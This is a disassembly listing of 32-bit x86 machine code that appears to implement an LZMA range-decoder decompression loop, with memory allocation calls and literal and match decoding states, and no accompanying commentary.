  406c19:	e9 20 0a 00 00       	jmp    0x40763e
  406c1e:	8b 5d bc             	mov    -0x44(%ebp),%ebx
  406c21:	8b 75 ac             	mov    -0x54(%ebp),%esi
  406c24:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
  406c2a:	83 f8 1c             	cmp    $0x1c,%eax
  406c2d:	0f 87 08 0a 00 00    	ja     0x40763b
  406c33:	ff 24 85 43 76 40 00 	jmp    *0x407643(,%eax,4)
  406c3a:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406c3e:	0f 84 e2 09 00 00    	je     0x407626
  406c44:	8b 45 90             	mov    -0x70(%ebp),%eax
  406c47:	ff 4d 94             	decl   -0x6c(%ebp)
  406c4a:	ff 45 90             	incl   -0x70(%ebp)
  406c4d:	8a 00                	mov    (%eax),%al
  406c4f:	3c e1                	cmp    $0xe1,%al
  406c51:	0f 87 e4 09 00 00    	ja     0x40763b
  406c57:	0f b6 c0             	movzbl %al,%eax
  406c5a:	6a 2d                	push   $0x2d
  406c5c:	99                   	cltd
  406c5d:	59                   	pop    %ecx
  406c5e:	f7 f9                	idiv   %ecx
  406c60:	6a 09                	push   $0x9
  406c62:	59                   	pop    %ecx
  406c63:	8b f0                	mov    %eax,%esi
  406c65:	0f b6 c2             	movzbl %dl,%eax
  406c68:	99                   	cltd
  406c69:	f7 f9                	idiv   %ecx
  406c6b:	8b ce                	mov    %esi,%ecx
  406c6d:	0f b6 fa             	movzbl %dl,%edi
  406c70:	33 d2                	xor    %edx,%edx
  406c72:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  406c75:	42                   	inc    %edx
  406c76:	d3 e2                	shl    %cl,%edx
  406c78:	8b c8                	mov    %eax,%ecx
  406c7a:	4a                   	dec    %edx
  406c7b:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  406c7e:	33 d2                	xor    %edx,%edx
  406c80:	42                   	inc    %edx
  406c81:	d3 e2                	shl    %cl,%edx
  406c83:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
  406c86:	be 00 03 00 00       	mov    $0x300,%esi
  406c8b:	d3 e6                	shl    %cl,%esi
  406c8d:	4a                   	dec    %edx
  406c8e:	89 55 e8             	mov    %edx,-0x18(%ebp)
  406c91:	81 c6 36 07 00 00    	add    $0x736,%esi
  406c97:	8d 3c 36             	lea    (%esi,%esi,1),%edi
  406c9a:	3b 7d 88             	cmp    -0x78(%ebp),%edi
  406c9d:	74 26                	je     0x406cc5
  406c9f:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  406ca3:	74 09                	je     0x406cae
  406ca5:	ff 75 fc             	push   -0x4(%ebp)
  406ca8:	ff 15 0c 81 40 00    	call   *0x40810c
  406cae:	57                   	push   %edi
  406caf:	6a 40                	push   $0x40
  406cb1:	ff 15 10 81 40 00    	call   *0x408110
  406cb7:	85 c0                	test   %eax,%eax
  406cb9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406cbc:	0f 84 79 09 00 00    	je     0x40763b
  406cc2:	89 7d 88             	mov    %edi,-0x78(%ebp)
  406cc5:	85 f6                	test   %esi,%esi
  406cc7:	74 0c                	je     0x406cd5
  406cc9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406ccc:	4e                   	dec    %esi
  406ccd:	66 c7 04 70 00 04    	movw   $0x400,(%eax,%esi,2)
  406cd3:	75 f4                	jne    0x406cc9
  406cd5:	83 65 b8 00          	andl   $0x0,-0x48(%ebp)
  406cd9:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  406cdd:	eb 26                	jmp    0x406d05
  406cdf:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406ce3:	0f 84 a6 08 00 00    	je     0x40758f
  406ce9:	8b 45 b8             	mov    -0x48(%ebp),%eax
  406cec:	ff 4d 94             	decl   -0x6c(%ebp)
  406cef:	8b c8                	mov    %eax,%ecx
  406cf1:	8b 45 90             	mov    -0x70(%ebp),%eax
  406cf4:	c1 e1 03             	shl    $0x3,%ecx
  406cf7:	0f b6 00             	movzbl (%eax),%eax
  406cfa:	d3 e0                	shl    %cl,%eax
  406cfc:	09 45 c0             	or     %eax,-0x40(%ebp)
  406cff:	ff 45 90             	incl   -0x70(%ebp)
  406d02:	ff 45 b8             	incl   -0x48(%ebp)
  406d05:	83 7d b8 04          	cmpl   $0x4,-0x48(%ebp)
  406d09:	7c d4                	jl     0x406cdf
  406d0b:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406d0e:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406d11:	74 28                	je     0x406d3b
  406d13:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  406d17:	89 45 8c             	mov    %eax,-0x74(%ebp)
  406d1a:	74 09                	je     0x406d25
  406d1c:	ff 75 f8             	push   -0x8(%ebp)
  406d1f:	ff 15 0c 81 40 00    	call   *0x40810c
  406d25:	ff 75 c0             	push   -0x40(%ebp)
  406d28:	6a 40                	push   $0x40
  406d2a:	ff 15 10 81 40 00    	call   *0x408110
  406d30:	85 c0                	test   %eax,%eax
  406d32:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406d35:	0f 84 00 09 00 00    	je     0x40763b
  406d3b:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406d3e:	8b 4d 8c             	mov    -0x74(%ebp),%ecx
  406d41:	c7 45 b8 05 00 00 00 	movl   $0x5,-0x48(%ebp)
  406d48:	80 64 08 ff 00       	andb   $0x0,-0x1(%eax,%ecx,1)
  406d4d:	eb 21                	jmp    0x406d70
  406d4f:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406d53:	0f 84 45 08 00 00    	je     0x40759e
  406d59:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406d5c:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406d5f:	ff 4d 94             	decl   -0x6c(%ebp)
  406d62:	0f b6 09             	movzbl (%ecx),%ecx
  406d65:	c1 e0 08             	shl    $0x8,%eax
  406d68:	0b c1                	or     %ecx,%eax
  406d6a:	ff 45 90             	incl   -0x70(%ebp)
  406d6d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406d70:	8b 45 b8             	mov    -0x48(%ebp),%eax
  406d73:	ff 4d b8             	decl   -0x48(%ebp)
  406d76:	85 c0                	test   %eax,%eax
  406d78:	75 d5                	jne    0x406d4f
  406d7a:	8b 45 a0             	mov    -0x60(%ebp),%eax
  406d7d:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406d80:	23 45 e4             	and    -0x1c(%ebp),%eax
  406d83:	c7 85 7c ff ff ff 06 	movl   $0x6,-0x84(%ebp)
  406d8a:	00 00 00 
  406d8d:	c1 e1 04             	shl    $0x4,%ecx
  406d90:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  406d93:	03 c8                	add    %eax,%ecx
  406d95:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406d98:	8d 34 48             	lea    (%eax,%ecx,2),%esi
  406d9b:	e9 6c 06 00 00       	jmp    0x40740c
  406da0:	33 d2                	xor    %edx,%edx
  406da2:	39 55 c0             	cmp    %edx,-0x40(%ebp)
  406da5:	75 6f                	jne    0x406e16
  406da7:	0f b6 45 a4          	movzbl -0x5c(%ebp),%eax
  406dab:	8b 75 a0             	mov    -0x60(%ebp),%esi
  406dae:	b1 08                	mov    $0x8,%cl
  406db0:	2a 4d c4             	sub    -0x3c(%ebp),%cl
  406db3:	23 75 e8             	and    -0x18(%ebp),%esi
  406db6:	d3 e8                	shr    %cl,%eax
  406db8:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  406dbb:	d3 e6                	shl    %cl,%esi
  406dbd:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406dc0:	03 c6                	add    %esi,%eax
  406dc2:	8d 04 40             	lea    (%eax,%eax,2),%eax
  406dc5:	c1 e0 09             	shl    $0x9,%eax
  406dc8:	83 7d c8 04          	cmpl   $0x4,-0x38(%ebp)
  406dcc:	8d 84 08 6c 0e 00 00 	lea    0xe6c(%eax,%ecx,1),%eax
  406dd3:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406dd6:	7d 05                	jge    0x406ddd
  406dd8:	89 55 c8             	mov    %edx,-0x38(%ebp)
  406ddb:	eb 10                	jmp    0x406ded
  406ddd:	83 7d c8 0a          	cmpl   $0xa,-0x38(%ebp)
  406de1:	7d 06                	jge    0x406de9
  406de3:	83 6d c8 03          	subl   $0x3,-0x38(%ebp)
  406de7:	eb 04                	jmp    0x406ded
  406de9:	83 6d c8 06          	subl   $0x6,-0x38(%ebp)
  406ded:	39 55 cc             	cmp    %edx,-0x34(%ebp)
  406df0:	74 1c                	je     0x406e0e
  406df2:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406df5:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  406df8:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406dfb:	72 03                	jb     0x406e00
  406dfd:	03 45 8c             	add    -0x74(%ebp),%eax
  406e00:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406e03:	33 db                	xor    %ebx,%ebx
  406e05:	43                   	inc    %ebx
  406e06:	8a 04 08             	mov    (%eax,%ecx,1),%al
  406e09:	88 45 a5             	mov    %al,-0x5b(%ebp)
  406e0c:	eb 68                	jmp    0x406e76
  406e0e:	33 db                	xor    %ebx,%ebx
  406e10:	43                   	inc    %ebx
  406e11:	e9 cd 01 00 00       	jmp    0x406fe3
  406e16:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406e19:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406e1c:	c7 45 cc 01 00 00 00 	movl   $0x1,-0x34(%ebp)
  406e23:	c7 85 7c ff ff ff 07 	movl   $0x7,-0x84(%ebp)
  406e2a:	00 00 00 
  406e2d:	8d b4 48 80 01 00 00 	lea    0x180(%eax,%ecx,2),%esi
  406e34:	e9 d3 05 00 00       	jmp    0x40740c
  406e39:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406e3d:	0f 84 67 07 00 00    	je     0x4075aa
  406e43:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406e46:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406e49:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406e4d:	0f b6 09             	movzbl (%ecx),%ecx
  406e50:	ff 4d 94             	decl   -0x6c(%ebp)
  406e53:	c1 e0 08             	shl    $0x8,%eax
  406e56:	0b c1                	or     %ecx,%eax
  406e58:	ff 45 90             	incl   -0x70(%ebp)
  406e5b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406e5e:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406e61:	39 45 b8             	cmp    %eax,-0x48(%ebp)
  406e64:	0f 85 ad 00 00 00    	jne    0x406f17
  406e6a:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406e70:	0f 8d 05 01 00 00    	jge    0x406f7b
  406e76:	0f b6 45 a5          	movzbl -0x5b(%ebp),%eax
  406e7a:	d0 65 a5             	shlb   $1,-0x5b(%ebp)
  406e7d:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  406e80:	c1 e8 07             	shr    $0x7,%eax
  406e83:	89 45 b8             	mov    %eax,-0x48(%ebp)
  406e86:	40                   	inc    %eax
  406e87:	c1 e0 08             	shl    $0x8,%eax
  406e8a:	03 c3                	add    %ebx,%eax
  406e8c:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  406e8f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406e92:	c1 e9 0b             	shr    $0xb,%ecx
  406e95:	66 8b 06             	mov    (%esi),%ax
  406e98:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406e9b:	0f b7 d0             	movzwl %ax,%edx
  406e9e:	0f af ca             	imul   %edx,%ecx
  406ea1:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406ea4:	73 1a                	jae    0x406ec0
  406ea6:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  406eaa:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406ead:	b9 00 08 00 00       	mov    $0x800,%ecx
  406eb2:	2b ca                	sub    %edx,%ecx
  406eb4:	c1 f9 05             	sar    $0x5,%ecx
  406eb7:	03 c8                	add    %eax,%ecx
  406eb9:	03 db                	add    %ebx,%ebx
  406ebb:	66 89 0e             	mov    %cx,(%esi)
  406ebe:	eb 1d                	jmp    0x406edd
  406ec0:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406ec3:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406ec6:	66 8b c8             	mov    %ax,%cx
  406ec9:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  406ed0:	66 c1 e9 05          	shr    $0x5,%cx
  406ed4:	2b c1                	sub    %ecx,%eax
  406ed6:	8d 5c 1b 01          	lea    0x1(%ebx,%ebx,1),%ebx
  406eda:	66 89 06             	mov    %ax,(%esi)
  406edd:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406ee4:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406ee7:	0f 83 71 ff ff ff    	jae    0x406e5e
  406eed:	e9 47 ff ff ff       	jmp    0x406e39
  406ef2:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406ef6:	0f 84 ba 06 00 00    	je     0x4075b6
  406efc:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406eff:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406f02:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406f06:	0f b6 09             	movzbl (%ecx),%ecx
  406f09:	ff 4d 94             	decl   -0x6c(%ebp)
  406f0c:	c1 e0 08             	shl    $0x8,%eax
  406f0f:	0b c1                	or     %ecx,%eax
  406f11:	ff 45 90             	incl   -0x70(%ebp)
  406f14:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406f17:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406f1d:	7d 5c                	jge    0x406f7b
  406f1f:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406f22:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  406f25:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406f28:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406f2b:	c1 e9 0b             	shr    $0xb,%ecx
  406f2e:	66 8b 06             	mov    (%esi),%ax
  406f31:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406f34:	0f b7 f8             	movzwl %ax,%edi
  406f37:	0f af cf             	imul   %edi,%ecx
  406f3a:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406f3d:	73 16                	jae    0x406f55
  406f3f:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406f42:	b9 00 08 00 00       	mov    $0x800,%ecx
  406f47:	2b cf                	sub    %edi,%ecx
  406f49:	c1 f9 05             	sar    $0x5,%ecx
  406f4c:	03 c8                	add    %eax,%ecx
  406f4e:	03 db                	add    %ebx,%ebx
  406f50:	66 89 0e             	mov    %cx,(%esi)
  406f53:	eb 15                	jmp    0x406f6a
  406f55:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406f58:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406f5b:	66 8b c8             	mov    %ax,%cx
  406f5e:	8d 5a 01             	lea    0x1(%edx),%ebx
  406f61:	66 c1 e9 05          	shr    $0x5,%cx
  406f65:	2b c1                	sub    %ecx,%eax
  406f67:	66 89 06             	mov    %ax,(%esi)
  406f6a:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406f71:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406f74:	73 a1                	jae    0x406f17
  406f76:	e9 77 ff ff ff       	jmp    0x406ef2
  406f7b:	83 65 cc 00          	andl   $0x0,-0x34(%ebp)
  406f7f:	8a 45 bc             	mov    -0x44(%ebp),%al
  406f82:	88 45 a4             	mov    %al,-0x5c(%ebp)
  406f85:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  406f89:	0f 84 3f 06 00 00    	je     0x4075ce
  406f8f:	8b 4d 98             	mov    -0x68(%ebp),%ecx
  406f92:	8a 45 a4             	mov    -0x5c(%ebp),%al
  406f95:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406f98:	ff 45 a0             	incl   -0x60(%ebp)
  406f9b:	ff 45 98             	incl   -0x68(%ebp)
  406f9e:	ff 4d 9c             	decl   -0x64(%ebp)
  406fa1:	88 01                	mov    %al,(%ecx)
  406fa3:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  406fa6:	88 04 11             	mov    %al,(%ecx,%edx,1)
  406fa9:	8d 41 01             	lea    0x1(%ecx),%eax
  406fac:	33 d2                	xor    %edx,%edx
  406fae:	f7 75 8c             	divl   -0x74(%ebp)
  406fb1:	e9 95 01 00 00       	jmp    0x40714b
  406fb6:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406fba:	0f 84 02 06 00 00    	je     0x4075c2
  406fc0:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406fc3:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406fc6:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406fca:	0f b6 09             	movzbl (%ecx),%ecx
  406fcd:	ff 4d 94             	decl   -0x6c(%ebp)
  406fd0:	c1 e0 08             	shl    $0x8,%eax
  406fd3:	0b c1                	or     %ecx,%eax
  406fd5:	ff 45 90             	incl   -0x70(%ebp)
  406fd8:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406fdb:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406fe1:	7d 9c                	jge    0x406f7f
  406fe3:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406fe6:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  406fe9:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406fec:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406fef:	c1 e9 0b             	shr    $0xb,%ecx
  406ff2:	66 8b 06             	mov    (%esi),%ax
  406ff5:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406ff8:	0f b7 f8             	movzwl %ax,%edi
  406ffb:	0f af cf             	imul   %edi,%ecx
  406ffe:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  407001:	73 16                	jae    0x407019
  407003:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  407006:	b9 00 08 00 00       	mov    $0x800,%ecx
  40700b:	2b cf                	sub    %edi,%ecx
  40700d:	c1 f9 05             	sar    $0x5,%ecx
  407010:	03 c8                	add    %eax,%ecx
  407012:	03 db                	add    %ebx,%ebx
  407014:	66 89 0e             	mov    %cx,(%esi)
  407017:	eb 15                	jmp    0x40702e
  407019:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  40701c:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  40701f:	66 8b c8             	mov    %ax,%cx
  407022:	8d 5a 01             	lea    0x1(%edx),%ebx
  407025:	66 c1 e9 05          	shr    $0x5,%cx
  407029:	2b c1                	sub    %ecx,%eax
  40702b:	66 89 06             	mov    %ax,(%esi)
  40702e:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  407035:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  407038:	73 a1                	jae    0x406fdb
  40703a:	e9 77 ff ff ff       	jmp    0x406fb6
  40703f:	83 7d c0 01          	cmpl   $0x1,-0x40(%ebp)
  407043:	75 1c                	jne    0x407061
  407045:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407048:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  40704b:	c7 85 7c ff ff ff 08 	movl   $0x8,-0x84(%ebp)
  407052:	00 00 00 
  407055:	8d b4 48 98 01 00 00 	lea    0x198(%eax,%ecx,2),%esi
  40705c:	e9 ab 03 00 00       	jmp    0x40740c
  407061:	8b 45 dc             	mov    -0x24(%ebp),%eax
  407064:	c7 45 80 16 00 00 00 	movl   $0x16,-0x80(%ebp)
  40706b:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40706e:	8b 45 d8             	mov    -0x28(%ebp),%eax
  407071:	89 45 dc             	mov    %eax,-0x24(%ebp)
  407074:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  407077:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40707a:	33 c0                	xor    %eax,%eax
  40707c:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  407080:	0f 9d c0             	setge  %al
  407083:	48                   	dec    %eax
  407084:	24 fd                	and    $0xfd,%al
  407086:	83 c0 0a             	add    $0xa,%eax
  407089:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40708c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40708f:	05 64 06 00 00       	add    $0x664,%eax
  407094:	89 45 a8             	mov    %eax,-0x58(%ebp)
  407097:	8b 75 a8             	mov    -0x58(%ebp),%esi
  40709a:	c7 85 7c ff ff ff 12 	movl   $0x12,-0x84(%ebp)
  4070a1:	00 00 00 
  4070a4:	e9 63 03 00 00       	jmp    0x40740c
  4070a9:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  4070ad:	75 21                	jne    0x4070d0
  4070af:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4070b2:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4070b5:	83 c0 0f             	add    $0xf,%eax
  4070b8:	c7 85 7c ff ff ff 09 	movl   $0x9,-0x84(%ebp)
  4070bf:	00 00 00 
  4070c2:	c1 e0 04             	shl    $0x4,%eax
  4070c5:	03 45 b4             	add    -0x4c(%ebp),%eax
  4070c8:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  4070cb:	e9 3c 03 00 00       	jmp    0x40740c
  4070d0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4070d3:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4070d6:	c7 85 7c ff ff ff 0a 	movl   $0xa,-0x84(%ebp)
  4070dd:	00 00 00 
  4070e0:	8d b4 48 b0 01 00 00 	lea    0x1b0(%eax,%ecx,2),%esi
  4070e7:	e9 20 03 00 00       	jmp    0x40740c
  4070ec:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  4070f0:	0f 85 b1 00 00 00    	jne    0x4071a7
  4070f6:	83 7d a0 00          	cmpl   $0x0,-0x60(%ebp)
  4070fa:	0f 84 3b 05 00 00    	je     0x40763b
  407100:	33 c0                	xor    %eax,%eax
  407102:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  407106:	0f 9d c0             	setge  %al
  407109:	8d 44 00 09          	lea    0x9(%eax,%eax,1),%eax
  40710d:	89 45 c8             	mov    %eax,-0x38(%ebp)
  407110:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  407114:	0f 84 c0 04 00 00    	je     0x4075da
  40711a:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40711d:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  407120:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  407123:	72 03                	jb     0x407128
  407125:	03 45 8c             	add    -0x74(%ebp),%eax
  407128:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40712b:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  40712e:	8b 45 ec             	mov    -0x14(%ebp),%eax
  407131:	88 4d a4             	mov    %cl,-0x5c(%ebp)
  407134:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  407137:	40                   	inc    %eax
  407138:	33 d2                	xor    %edx,%edx
  40713a:	f7 75 8c             	divl   -0x74(%ebp)
  40713d:	8b 45 98             	mov    -0x68(%ebp),%eax
  407140:	ff 45 a0             	incl   -0x60(%ebp)
  407143:	ff 45 98             	incl   -0x68(%ebp)
  407146:	ff 4d 9c             	decl   -0x64(%ebp)
  407149:	88 08                	mov    %cl,(%eax)
  40714b:	89 55 ec             	mov    %edx,-0x14(%ebp)
  40714e:	c7 85 78 ff ff ff 02 	movl   $0x2,-0x88(%ebp)
  407155:	00 00 00 
  407158:	e9 c7 fa ff ff       	jmp    0x406c24
  40715d:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  407161:	75 05                	jne    0x407168
  407163:	8b 45 d8             	mov    -0x28(%ebp),%eax
  407166:	eb 36                	jmp    0x40719e
  407168:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40716b:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  40716e:	c7 85 7c ff ff ff 0b 	movl   $0xb,-0x84(%ebp)
  407175:	00 00 00 
  407178:	8d b4 48 c8 01 00 00 	lea    0x1c8(%eax,%ecx,2),%esi
  40717f:	e9 88 02 00 00       	jmp    0x40740c
  407184:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  407188:	75 05                	jne    0x40718f
  40718a:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40718d:	eb 09                	jmp    0x407198
  40718f:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  407192:	8b 45 e0             	mov    -0x20(%ebp),%eax
  407195:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  407198:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40719b:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  40719e:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4071a1:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4071a4:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  4071a7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4071aa:	c7 45 80 15 00 00 00 	movl   $0x15,-0x80(%ebp)
  4071b1:	05 68 0a 00 00       	add    $0xa68,%eax
  4071b6:	89 45 a8             	mov    %eax,-0x58(%ebp)
  4071b9:	e9 d9 fe ff ff       	jmp    0x407097
  4071be:	33 c0                	xor    %eax,%eax
  4071c0:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  4071c4:	0f 9d c0             	setge  %al
  4071c7:	48                   	dec    %eax
  4071c8:	24 fd                	and    $0xfd,%al
  4071ca:	83 c0 0b             	add    $0xb,%eax
  4071cd:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4071d0:	e9 9a 01 00 00       	jmp    0x40736f
  4071d5:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4071d8:	83 f8 04             	cmp    $0x4,%eax
  4071db:	7c 03                	jl     0x4071e0
  4071dd:	6a 03                	push   $0x3
  4071df:	58                   	pop    %eax
  4071e0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4071e3:	c7 45 c0 06 00 00 00 	movl   $0x6,-0x40(%ebp)
  4071ea:	c1 e0 07             	shl    $0x7,%eax
  4071ed:	c7 45 84 19 00 00 00 	movl   $0x19,-0x7c(%ebp)
  4071f4:	8d 84 08 60 03 00 00 	lea    0x360(%eax,%ecx,1),%eax
  4071fb:	89 45 a8             	mov    %eax,-0x58(%ebp)
  4071fe:	e9 ce 02 00 00       	jmp    0x4074d1
  407203:	83 fb 04             	cmp    $0x4,%ebx
  407206:	7c 34                	jl     0x40723c
  407208:	8b cb                	mov    %ebx,%ecx
  40720a:	8b c3                	mov    %ebx,%eax
  40720c:	d1 f9                	sar    $1,%ecx
  40720e:	83 e0 01             	and    $0x1,%eax
  407211:	49                   	dec    %ecx
  407212:	0c 02                	or     $0x2,%al
  407214:	d3 e0                	shl    %cl,%eax
  407216:	83 fb 0e             	cmp    $0xe,%ebx
  407219:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40721c:	7d 14                	jge    0x407232
  40721e:	8b 55 fc             	mov    -0x4(%ebp),%edx
  407221:	2b c3                	sub    %ebx,%eax
  407223:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  407226:	8d 84 42 5e 05 00 00 	lea    0x55e(%edx,%eax,2),%eax
  40722d:	e9 81 00 00 00       	jmp    0x4072b3
  407232:	33 db                	xor    %ebx,%ebx
  407234:	83 c1 fc             	add    $0xfffffffc,%ecx
  407237:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  40723a:	eb 33                	jmp    0x40726f
  40723c:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  40723f:	e9 28 01 00 00       	jmp    0x40736c
  407244:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  407248:	0f 84 98 03 00 00    	je     0x4075e6
  40724e:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  407251:	8b 45 f4             	mov    -0xc(%ebp),%eax
  407254:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  407258:	0f b6 09             	movzbl (%ecx),%ecx
  40725b:	ff 4d 94             	decl   -0x6c(%ebp)
  40725e:	c1 e0 08             	shl    $0x8,%eax
  407261:	0b c1                	or     %ecx,%eax
  407263:	ff 45 90             	incl   -0x70(%ebp)
  407266:	89 45 f4             	mov    %eax,-0xc(%ebp)
  407269:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40726c:	ff 4d b8             	decl   -0x48(%ebp)
  40726f:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  407273:	7e 27                	jle    0x40729c
  407275:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  407278:	03 db                	add    %ebx,%ebx
  40727a:	d1 6d f0             	shrl   $1,-0x10(%ebp)
  40727d:	3b 4d f0             	cmp    -0x10(%ebp),%ecx
  407280:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  407283:	72 0c                	jb     0x407291
  407285:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407288:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  40728b:	83 cb 01             	or     $0x1,%ebx
  40728e:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  407291:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  407298:	73 d2                	jae    0x40726c
  40729a:	eb a8                	jmp    0x407244
